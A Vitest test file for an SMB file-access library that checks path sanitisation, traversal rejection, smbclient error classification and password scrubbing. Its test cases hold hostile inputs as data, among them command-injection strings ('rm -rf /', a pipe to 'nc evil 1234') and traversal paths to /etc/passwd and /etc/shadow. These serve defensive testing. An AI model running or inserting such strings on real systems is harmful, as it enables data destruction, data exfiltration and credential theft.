import { describe, it, expect } from 'vitest';
import { BASE_PATH, sanitizePath, validatePathNoTraversal } from '../../server/lib/smb';
import { extractSmbReason, scrubSmbArgs } from '../../server/lib/smb.posix';

describe('SMB path validation', () => {
  describe('sanitizePath', () => {
    it('allows normal paths', () => {
      expect(() => sanitizePath('MyWorks/M42/image.jpg')).not.toThrow();
      expect(() => sanitizePath('MyWorks/IC 1318/sub_001.fit')).not.toThrow();
    });

    it('rejects null bytes', () => {
      expect(() => sanitizePath('MyWorks/M42\x00evil')).toThrow('Invalid characters');
    });

    it('rejects backticks', () => {
      expect(() => sanitizePath('MyWorks/`rm -rf /`')).toThrow('Invalid characters');
    });

    it('rejects dollar signs', () => {
      expect(() => sanitizePath('MyWorks/$HOME')).toThrow('Invalid characters');
    });

    it('rejects backslashes', () => {
      expect(() => sanitizePath('MyWorks\\evil')).toThrow('Invalid characters');
    });
  });

  describe('validatePathNoTraversal', () => {
    it('allows normal paths', () => {
      expect(() => validatePathNoTraversal('MyWorks/M42/image.jpg')).not.toThrow();
    });

    it('rejects path traversal', () => {
      expect(() => validatePathNoTraversal('MyWorks/../../../etc/passwd')).toThrow('Path traversal');
    });

    it('rejects sneaky traversal where normalize collapses to a different prefix', () => {
      // path.normalize('MyWorks/M42/../../etc/shadow') -> 'etc/shadow'
      // The hardened check rejects when the normalized first segment differs from the input's.
      expect(() => validatePathNoTraversal('MyWorks/M42/../../etc/shadow')).toThrow('Path traversal');
    });

    it('rejects absolute paths', () => {
      expect(() => validatePathNoTraversal('/etc/passwd')).toThrow('Path traversal');
    });
  });

  describe('sanitizePath additional rejects', () => {
    it('rejects double-quote (closes smbclient cd quote)', () => {
      expect(() => sanitizePath('M42"; del important.fit"')).toThrow('Invalid characters');
    });
    it('rejects semicolon (smbclient command separator)', () => {
      expect(() => sanitizePath('M42; ls')).toThrow('Invalid characters');
    });
    it('rejects newlines', () => {
      expect(() => sanitizePath('M42\nls')).toThrow('Invalid characters');
    });
    it('rejects carriage returns', () => {
      expect(() => sanitizePath('M42\rls')).toThrow('Invalid characters');
    });
    it('rejects ampersand (shell background)', () => {
      expect(() => sanitizePath('M42 & rm -rf /')).toThrow('Invalid characters');
    });
    it('rejects pipe (shell pipeline)', () => {
      expect(() => sanitizePath('M42 | nc evil 1234')).toThrow('Invalid characters');
    });
    it('rejects DEL control character (0x7f)', () => {
      expect(() => sanitizePath('M42\x7fevil')).toThrow('Invalid characters');
    });
  });

  describe('validatePathNoTraversal additional rejects', () => {
    it('rejects Windows-style absolute path', () => {
      expect(() => validatePathNoTraversal('\\Windows\\System32')).toThrow('Path traversal');
    });
    it('rejects bare ".." segment', () => {
      expect(() => validatePathNoTraversal('..')).toThrow('Path traversal');
    });
    it('rejects "../" prefix', () => {
      expect(() => validatePathNoTraversal('../etc/passwd')).toThrow('Path traversal');
    });
    it('rejects mid-path ".." that survives normalize', () => {
      // Some traversals normalize down to a path that still contains '..'
      expect(() => validatePathNoTraversal('a/../../b')).toThrow('Path traversal');
    });
  });
});

describe('extractSmbReason', () => {
  // execFile rejections from smbclient: the NT_STATUS / connect diagnostics land
  // on stdout, not stderr, so classifying stderr alone (the old behaviour)
  // returned "Connection failed" for almost everything.
  const smbErr = (over: { stdout?: string; stderr?: string; message?: string; code?: string }) =>
    Object.assign(new Error(over.message ?? 'Command failed: smbclient //h/s -U root%hunter2 -c ...'), over);

  it('reads NT_STATUS off stdout', () => {
    expect(extractSmbReason(smbErr({ stdout: 'session setup failed: NT_STATUS_LOGON_FAILURE\n' })))
      .toBe('NT_STATUS_LOGON_FAILURE');
  });

  it('classifies a bad share name from stdout', () => {
    expect(extractSmbReason(smbErr({ stdout: 'tree connect failed: NT_STATUS_BAD_NETWORK_NAME' })))
      .toBe('NT_STATUS_BAD_NETWORK_NAME');
  });

  it('classifies a plain session-setup failure with no NT_STATUS token', () => {
    expect(extractSmbReason(smbErr({ stdout: 'session setup failed: (auth error)' })))
      .toBe('Authentication failed');
  });

  it('detects a missing smbclient binary', () => {
    expect(extractSmbReason(smbErr({ code: 'ENOENT', message: 'spawn smbclient ENOENT' })))
      .toBe('smbclient is not installed on the server');
  });

  it('detects protocol negotiation failure', () => {
    expect(extractSmbReason(smbErr({ stdout: 'protocol negotiation failed: NT_STATUS_CONNECTION_RESET' })))
      .toBe('NT_STATUS_CONNECTION_RESET');
  });

  it('still falls back to Connection failed when nothing is recognisable', () => {
    expect(extractSmbReason(smbErr({ stdout: '', stderr: '' }))).toBe('Connection failed');
  });

  it('never leaks the password from the command line', () => {
    const reason = extractSmbReason(smbErr({ stderr: 'do_connect: -U root%hunter2 failed' }));
    expect(reason).not.toContain('hunter2');
  });
});

describe('scrubSmbArgs', () => {
  it('masks -U user%password', () => {
    expect(scrubSmbArgs('smbclient //h/s -U root%hunter2 -c ls')).not.toContain('hunter2');
  });
  it('masks -U user with no inline password', () => {
    expect(scrubSmbArgs('smbclient //h/s -U administrator -c ls')).toContain('-U ***');
  });
});

describe('BASE_PATH constant', () => {
  it('is set to MyWorks', () => {
    expect(BASE_PATH).toBe('MyWorks');
  });
});
